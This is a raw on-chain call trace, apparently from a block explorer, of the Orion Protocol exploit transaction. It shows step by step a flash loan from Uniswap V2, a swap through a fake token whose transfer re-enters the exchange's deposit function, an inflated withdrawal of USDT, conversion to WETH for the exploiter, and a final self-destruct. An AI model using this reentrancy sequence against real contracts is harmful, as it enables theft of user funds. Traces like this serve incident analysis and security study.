"[Sender]Orion Protocol Exploiter 2\n0 \n CALL[Receiver] Orion Protocol Exploit Contract.start()\n()\n1 \n STATICCALLUniswap V2: USDT.token0()\n(Wrapped Ether)\n1 \n STATICCALLUniswap V2: USDT.token1()\n(Tether: USDT Stablecoin)\n1 \n STATICCALLTether: USDT Stablecoin.allowance(_owner=[Receiver]Orion Protocol Exploit Contract, _spender=Orion Protocol: Official Funds Recovery Address)\n(remaining=0)\n1 \n CALLTether: USDT Stablecoin.approve(_spender=Orion Protocol: Official Funds Recovery Address, _value=(long param))\n()\n2 \n EVENTTether: USDT Stablecoin.Approval(owner=[Receiver]Orion Protocol Exploit Contract, spender=Orion Protocol: Official Funds Recovery Address, value=(long param))\n1 \n STATICCALLCircle: USD Coin Token (USDC).allowance(owner=[Receiver]Orion Protocol Exploit Contract, spender=Orion Protocol: Official Funds Recovery Address)\n(0)\n2 \n DELEGATECALLFiatTokenV2_1.allowance(owner=[Receiver]Orion Protocol Exploit Contract, spender=Orion Protocol: Official Funds Recovery Address)\n(0)\n1 \n CALLCircle: USD Coin Token (USDC).approve(spender=Orion Protocol: Official Funds Recovery Address, value=(long param))\n(true)\n2 \n DELEGATECALLFiatTokenV2_1.approve(spender=Orion Protocol: Official Funds Recovery Address, value=(long param))\n(true)\n3 \n EVENTCircle: USD Coin Token (USDC).Approval(owner=[Receiver]Orion Protocol Exploit Contract, spender=Orion Protocol: Official Funds Recovery Address, value=(long param))\n1 \n STATICCALLCircle: USD Coin Token (USDC).allowance(owner=[Receiver]Orion Protocol Exploit Contract, spender=0x13e5_OrionPool V2 (UNI-V2))\n(0)\n2 \n DELEGATECALLFiatTokenV2_1.allowance(owner=[Receiver]Orion Protocol Exploit Contract, spender=0x13e5_OrionPool V2 (UNI-V2))\n(0)\n1 \n CALLCircle: USD Coin Token (USDC).approve(spender=0x13e5_OrionPool V2 (UNI-V2), value=(long param))\n(true)\n2 \n DELEGATECALLFiatTokenV2_1.approve(spender=0x13e5_OrionPool V2 (UNI-V2), value=(long param))\n(true)\n3 \n EVENTCircle: USD Coin Token (USDC).Approval(owner=[Receiver]Orion Protocol Exploit Contract, spender=0x13e5_OrionPool V2 (UNI-V2), value=(long param))\n1 \n CALLOrion Protocol: Official Funds Recovery Address.depositAsset(assetAddress=Circle: USD Coin Token (USDC), amount=500,000)\n()\n2 \n DELEGATECALLExchangeWithAtomic.depositAsset(assetAddress=Circle: USD Coin Token (USDC), amount=500,000)\n()\n3 \n STATICCALLCircle: USD Coin Token (USDC).balanceOf(account=Orion Protocol: Official Funds Recovery Address)\n(542,050,350,213)\n4 \n DELEGATECALLFiatTokenV2_1.balanceOf(account=Orion Protocol: Official Funds Recovery Address)\n(542,050,350,213)\n3 \n CALLCircle: USD Coin Token (USDC).transferFrom(from=[Receiver]Orion Protocol Exploit Contract, to=Orion Protocol: Official Funds Recovery Address, value=500,000)\n(true)\n4 \n DELEGATECALLFiatTokenV2_1.transferFrom(from=[Receiver]Orion Protocol Exploit Contract, to=Orion Protocol: Official Funds Recovery Address, value=500,000)\n(true)\n5 \n EVENTCircle: USD Coin Token (USDC).Transfer(from=[Receiver]Orion Protocol Exploit Contract, to=Orion Protocol: Official Funds Recovery Address, value=500,000)\n3 \n STATICCALLCircle: USD Coin Token (USDC).balanceOf(account=Orion Protocol: Official Funds Recovery Address)\n(542,050,850,213)\n4 \n DELEGATECALLFiatTokenV2_1.balanceOf(account=Orion Protocol: Official Funds Recovery Address)\n(542,050,850,213)\n3 \n STATICCALLCircle: USD Coin Token (USDC).decimals()\n(6)\n4 \n DELEGATECALLFiatTokenV2_1.decimals()\n(6)\n3 \n EVENTOrion Protocol: Official Funds Recovery Address.NewAssetTransaction(user=[Receiver]Orion Protocol Exploit Contract, assetAddress=Circle: USD Coin Token (USDC), isDeposit=true, amount=50,000,000, timestamp=1,675,353,395)\n1 \n CALLUniswap V2: USDT.swap(amount0Out=0, amount1Out=2,844,766,426,325, to=[Receiver]Orion Protocol Exploit Contract, data=(long param))\n()\n2 \n CALLTether: USDT Stablecoin.transfer(_to=[Receiver]Orion Protocol Exploit Contract, _value=2,844,766,426,325)\n()\n3 \n EVENTTether: USDT Stablecoin.Transfer(from=Uniswap V2: USDT, to=[Receiver]Orion Protocol Exploit Contract, value=2,844,766,426,325)\n2 \n CALL[Receiver] Orion Protocol Exploit Contract.uniswapV2Call(sender=[Receiver]Orion Protocol Exploit Contract, amount0=0, amount1=2,844,766,426,325, data=(long param))\n()\n3 \n STATICCALLCircle: USD Coin Token (USDC).decimals()\n(6)\n4 \n DELEGATECALLFiatTokenV2_1.decimals()\n(6)\n3 \n CALLOrion Protocol: Official Funds Recovery Address.swapThroughOrionPool(amount_spend=10,000, amount_receive=0, path=[Circle: USD Coin Token (USDC), tokenA (ATK), Tether: USDT Stablecoin], is_exact_spend=true)\n()\n4 \n DELEGATECALLExchangeWithAtomic.swapThroughOrionPool(amount_spend=10,000, amount_receive=0, path=[Circle: USD Coin Token (USDC), tokenA (ATK), Tether: USDT Stablecoin], is_exact_spend=true)\n()\n5 \n DELEGATECALLLibPool.0x4729ed3c(raw data)\n(raw data)\n6 \n STATICCALLPoolFunctionality.isFactory(a=Circle: USD Coin Token (USDC))\n(false)\n6 \n CALLPoolFunctionality.doSwapThroughOrionPool(user=Orion Protocol: Official Funds Recovery Address, to=Orion Protocol: Official Funds Recovery Address, swapData=[amount_spend=10,000, amount_receive=0, orionpool_router=PoolFunctionality, is_exact_spend=true, supportingFee=false, isInContractTrade=true, isSentETHEnough=false, isFromWallet=false, asset_spend=Circle: USD Coin Token (USDC), path=[Circle: USD Coin Token (USDC), tokenA (ATK), Tether: USDT Stablecoin]])\n(amountOut=10,000, amountIn=284,476,642,642,500)\n7 \n STATICCALLCircle: USD Coin Token (USDC).decimals()\n(6)\n8 \n DELEGATECALLFiatTokenV2_1.decimals()\n(6)\n7 \n STATICCALLTether: USDT Stablecoin.decimals()\n(6)\n7 \n STATICCALLOrionPoolV2Factory.getPair(Circle: USD Coin Token (USDC), tokenA (ATK))\n(0x76fe_OrionPool V2 (UNI-V2))\n7 \n STATICCALL0x76fe_OrionPool V2 (UNI-V2).getReserves()\n(_reserve0=500,000,000,000,000,000, _reserve1=500,000, _blockTimestampLast=1,675,353,059)\n7 \n STATICCALLOrionPoolV2Factory.getPair(tokenA (ATK), Tether: USDT Stablecoin)\n(0x13e5_OrionPool V2 (UNI-V2))\n7 \n STATICCALL0x13e5_OrionPool V2 (UNI-V2).getReserves()\n(_reserve0=500,000,000,000,000,000, _reserve1=500,000, _blockTimestampLast=1,675,353,059)\n7 \n STATICCALLOrionPoolV2Factory.getPair(Circle: USD Coin Token (USDC), tokenA (ATK))\n(0x76fe_OrionPool V2 (UNI-V2))\n7 \n CALLOrion Protocol: Official Funds Recovery Address.safeAutoTransferFrom(token=Circle: USD Coin Token (USDC), from=Orion Protocol: Official Funds Recovery Address, to=0x76fe_OrionPool V2 (UNI-V2), value=100)\n()\n8 \n DELEGATECALLExchangeWithAtomic.safeAutoTransferFrom(token=Circle: USD Coin Token (USDC), from=Orion Protocol: Official Funds Recovery Address, to=0x76fe_OrionPool V2 (UNI-V2), value=100)\n()\n9 \n CALLCircle: USD Coin Token (USDC).transfer(to=0x76fe_OrionPool V2 (UNI-V2), value=100)\n(true)\n10 \n DELEGATECALLFiatTokenV2_1.transfer(to=0x76fe_OrionPool V2 (UNI-V2), value=100)\n(true)\n11 \n EVENTCircle: USD Coin Token (USDC).Transfer(from=Orion Protocol: Official Funds Recovery Address, to=0x76fe_OrionPool V2 (UNI-V2), value=100)\n7 \n STATICCALLTether: USDT Stablecoin.balanceOf(who=Orion Protocol: Official Funds Recovery Address)\n(2,844,766,426,325)\n7 \n STATICCALLOrionPoolV2Factory.getPair(Circle: USD Coin Token (USDC), tokenA (ATK))\n(0x76fe_OrionPool V2 (UNI-V2))\n7 \n STATICCALLOrionPoolV2Factory.getPair(tokenA (ATK), Tether: USDT Stablecoin)\n(0x13e5_OrionPool V2 (UNI-V2))\n7 \n CALL0x76fe_OrionPool V2 (UNI-V2).swap(amount0Out=99,680,123,783,317, amount1Out=0, to=0x13e5_OrionPool V2 (UNI-V2), data=\"\")\n()\n8 \n CALLtokenA (ATK).transfer(recipient=0x13e5_OrionPool V2 (UNI-V2), amount=99,680,123,783,317)\n(true)\n9 \n EVENTtokenA (ATK).Transfer(from=0x76fe_OrionPool V2 (UNI-V2), to=0x13e5_OrionPool V2 (UNI-V2), value=99,680,123,783,317)\n9 \n CALL[Receiver] Orion Protocol Exploit Contract.deposit()\n()\n10 \n STATICCALLTether: USDT Stablecoin.balanceOf(who=[Receiver]Orion Protocol Exploit Contract)\n(2,844,766,426,326)\n10 \n CALLOrion Protocol: Official Funds Recovery Address.depositAsset(assetAddress=Tether: USDT Stablecoin, amount=2,844,766,426,326)\n()\n11 \n DELEGATECALLExchangeWithAtomic.depositAsset(assetAddress=Tether: USDT Stablecoin, amount=2,844,766,426,326)\n()\n12 \n STATICCALLTether: USDT Stablecoin.balanceOf(who=Orion Protocol: Official Funds Recovery Address)\n(2,844,766,426,325)\n12 \n CALLTether: USDT Stablecoin.transferFrom(_from=[Receiver]Orion Protocol Exploit Contract, _to=Orion Protocol: Official Funds Recovery Address, _value=2,844,766,426,326)\n()\n13 \n EVENTTether: USDT Stablecoin.Transfer(from=[Receiver]Orion Protocol Exploit Contract, to=Orion Protocol: Official Funds Recovery Address, value=2,844,766,426,326)\n12 \n STATICCALLTether: USDT Stablecoin.balanceOf(who=Orion Protocol: Official Funds Recovery Address)\n(5,689,532,852,651)\n12 \n STATICCALLTether: USDT Stablecoin.decimals()\n(6)\n12 \n EVENTOrion Protocol: Official Funds Recovery Address.NewAssetTransaction(user=[Receiver]Orion Protocol Exploit Contract, assetAddress=Tether: USDT Stablecoin, isDeposit=true, amount=284,476,642,632,600, timestamp=1,675,353,395)\n9 \n STATICCALL0x000000000000000000636f6e736f6c652e6c6f67.log(description=TokenA counter :, _when=3)\n()\n8 \n STATICCALLtokenA (ATK).balanceOf(account=0x76fe_OrionPool V2 (UNI-V2))\n(499,900,319,876,216,683)\n8 \n STATICCALLCircle: USD Coin Token (USDC).balanceOf(account=0x76fe_OrionPool V2 (UNI-V2))\n(500,100)\n9 \n DELEGATECALLFiatTokenV2_1.balanceOf(account=0x76fe_OrionPool V2 (UNI-V2))\n(500,100)\n8 \n EVENT0x76fe_OrionPool V2 (UNI-V2).Sync(reserve0=499,900,319,876,216,683, reserve1=500,100)\n8 \n EVENT0x76fe_OrionPool V2 (UNI-V2).Swap(sender=PoolFunctionality, to=0x13e5_OrionPool V2 (UNI-V2), amount0In=0, amount1In=100, amount0Out=99,680,123,783,317, amount1Out=0)\n7 \n STATICCALLOrionPoolV2Factory.getPair(tokenA (ATK), Tether: USDT Stablecoin)\n(0x13e5_OrionPool V2 (UNI-V2))\n7 \n CALL0x13e5_OrionPool V2 (UNI-V2).swap(amount0Out=0, amount1Out=99, to=Orion Protocol: Official Funds Recovery Address, data=\"\")\n()\n8 \n CALLTether: USDT Stablecoin.transfer(_to=Orion Protocol: Official Funds Recovery Address, _value=99)\n()\n9 \n EVENTTether: USDT Stablecoin.Transfer(from=0x13e5_OrionPool V2 (UNI-V2), to=Orion Protocol: Official Funds Recovery Address, value=99)\n8 \n STATICCALLtokenA (ATK).balanceOf(account=0x13e5_OrionPool V2 (UNI-V2))\n(500,099,680,123,783,317)\n8 \n STATICCALLTether: USDT Stablecoin.balanceOf(who=0x13e5_OrionPool V2 (UNI-V2))\n(499,901)\n8 \n EVENT0x13e5_OrionPool V2 (UNI-V2).Sync(reserve0=500,099,680,123,783,317, reserve1=499,901)\n8 \n EVENT0x13e5_OrionPool V2 (UNI-V2).Swap(sender=PoolFunctionality, to=Orion Protocol: Official Funds Recovery Address, amount0In=99,680,123,783,317, amount1In=0, amount0Out=0, amount1Out=99)\n7 \n STATICCALLTether: USDT Stablecoin.balanceOf(who=Orion Protocol: Official Funds Recovery Address)\n(5,689,532,852,750)\n7 \n EVENTPoolFunctionality.OrionPoolSwap(sender=[Sender]Orion Protocol Exploiter 2, st=Circle: USD Coin Token (USDC), rt=Tether: USDT Stablecoin, st_r=100, st_a=100, rt_r=0, rt_a=2,844,766,426,425, f=OrionPoolV2Factory)\n7 \n STATICCALLCircle: USD Coin Token (USDC).decimals()\n(6)\n8 \n DELEGATECALLFiatTokenV2_1.decimals()\n(6)\n7 \n STATICCALLTether: USDT Stablecoin.decimals()\n(6)\n3 \n STATICCALLTether: USDT Stablecoin.decimals()\n(6)\n3 \n STATICCALLOrion Protocol: Official Funds Recovery Address.getBalance(assetAddress=Tether: USDT Stablecoin, user=[Receiver]Orion Protocol Exploit Contract)\n(568,953,285,275,100)\n4 \n DELEGATECALLExchangeWithAtomic.getBalance(assetAddress=Tether: USDT Stablecoin, user=[Receiver]Orion Protocol Exploit Contract)\n(568,953,285,275,100)\n3 \n STATICCALLTether: USDT Stablecoin.balanceOf(who=Orion Protocol: Official Funds Recovery Address)\n(5,689,532,852,750)\n3 \n STATICCALLTether: USDT Stablecoin.balanceOf(who=Orion Protocol: Official Funds Recovery Address)\n(5,689,532,852,750)\n3 \n CALLOrion Protocol: Official Funds Recovery Address.withdraw(assetAddress=Tether: USDT Stablecoin, amount=5,689,532,852,749)\n()\n4 \n DELEGATECALLExchangeWithAtomic.withdraw(assetAddress=Tether: USDT Stablecoin, amount=5,689,532,852,749)\n()\n5 \n STATICCALLTether: USDT Stablecoin.decimals()\n(6)\n5 \n CALLTether: USDT Stablecoin.transfer(_to=[Receiver]Orion Protocol Exploit Contract, _value=5,689,532,852,749)\n()\n6 \n EVENTTether: USDT Stablecoin.Transfer(from=Orion Protocol: Official Funds Recovery Address, to=[Receiver]Orion Protocol Exploit Contract, value=5,689,532,852,749)\n5 \n EVENTOrion Protocol: Official Funds Recovery Address.NewAssetTransaction(user=[Receiver]Orion Protocol Exploit Contract, assetAddress=Tether: USDT Stablecoin, isDeposit=false, amount=568,953,285,274,900, timestamp=1,675,353,395)\n3 \n CALLTether: USDT Stablecoin.transfer(_to=Uniswap V2: USDT, _value=2,853,326,405,542)\n()\n4 \n EVENTTether: USDT Stablecoin.Transfer(from=[Receiver]Orion Protocol Exploit Contract, to=Uniswap V2: USDT, value=2,853,326,405,542)\n2 \n STATICCALLWrapped Ether.balanceOf(Uniswap V2: USDT)\n(10,647,231,623,278,074,419,406)\n2 \n STATICCALLTether: USDT Stablecoin.balanceOf(who=Uniswap V2: USDT)\n(17,872,740,141,362)\n2 \n EVENTUniswap V2: USDT.Sync(reserve0=10,647,231,623,278,074,419,406, reserve1=17,872,740,141,362)\n2 \n EVENTUniswap V2: USDT.Swap(sender=[Receiver]Orion Protocol Exploit Contract, to=[Receiver]Orion Protocol Exploit Contract, amount0In=0, amount1In=2,853,326,405,542, amount0Out=0, amount1Out=2,844,766,426,325)\n1 \n STATICCALLTether: USDT Stablecoin.balanceOf(who=[Receiver]Orion Protocol Exploit Contract)\n(2,836,206,447,207)\n1 \n CALLTether: USDT Stablecoin.approve(_spender=Uniswap V3: Router, _value=2,836,206,447,207)\n()\n2 \n EVENTTether: USDT Stablecoin.Approval(owner=[Receiver]Orion Protocol Exploit Contract, spender=Uniswap V3: Router, value=2,836,206,447,207)\n1 \n CALLUniswap V3: Router.exactInputSingle(params=[tokenIn=Tether: USDT Stablecoin, tokenOut=Wrapped Ether, fee=3,000, recipient=Orion Protocol Exploiter, deadline=1,675,353,395, amountIn=2,836,206,447,207, amountOutMinimum=0, sqrtPriceLimitX96=0])\n(amountOut=1,651,247,397,448,511,042,353)\n2 \n CALLUniswap V3: USDT.swap(recipient=Orion Protocol Exploiter, zeroForOne=false, amountSpecified=2,836,206,447,207, sqrtPriceLimitX96=1,461,446,703,485,210,103,287,273,052,203,988,822,378,723,970,341, data=(long param))\n(amount0=-1,651,247,397,448,511,042,353, amount1=2,836,206,447,207)\n3 \n CALLWrapped Ether.transfer(dst=Orion Protocol Exploiter, wad=1,651,247,397,448,511,042,353)\n(true)\n4 \n EVENTWrapped Ether.Transfer(src=Uniswap V3: USDT, dst=Orion Protocol Exploiter, wad=1,651,247,397,448,511,042,353)\n3 \n STATICCALLTether: USDT Stablecoin.balanceOf(who=Uniswap V3: USDT)\n(34,916,726,858,725)\n3 \n CALLUniswap V3: Router.uniswapV3SwapCallback(amount0Delta=-1,651,247,397,448,511,042,353, amount1Delta=2,836,206,447,207, _data=(long param))\n()\n4 \n CALLTether: USDT Stablecoin.transferFrom(_from=[Receiver]Orion Protocol Exploit Contract, _to=Uniswap V3: USDT, _value=2,836,206,447,207)\n()\n5 \n EVENTTether: USDT Stablecoin.Transfer(from=[Receiver]Orion Protocol Exploit Contract, to=Uniswap V3: USDT, value=2,836,206,447,207)\n3 \n STATICCALLTether: USDT Stablecoin.balanceOf(who=Uniswap V3: USDT)\n(37,752,933,305,932)\n3 \n EVENTUniswap V3: USDT.Swap(sender=Uniswap V3: Router, recipient=Orion Protocol Exploiter, amount0=-1,651,247,397,448,511,042,353, amount1=2,836,206,447,207, sqrtPriceX96=3,311,494,651,790,037,971,086,765, liquidity=3,418,682,182,588,023,113, tick=-201,664)\n1 \n STATICCALLWrapped Ether.balanceOf([Receiver]Orion Protocol Exploit Contract)\n(0)\n1 \n CALLWrapped Ether.transfer(dst=Orion Protocol Exploiter, wad=0)\n(true)\n2 \n EVENTWrapped Ether.Transfer(src=[Receiver]Orion Protocol Exploit Contract, dst=Orion Protocol Exploiter, wad=0)\n1 \n SELFDESTRUCTOrion Protocol Exploiter.()\n()"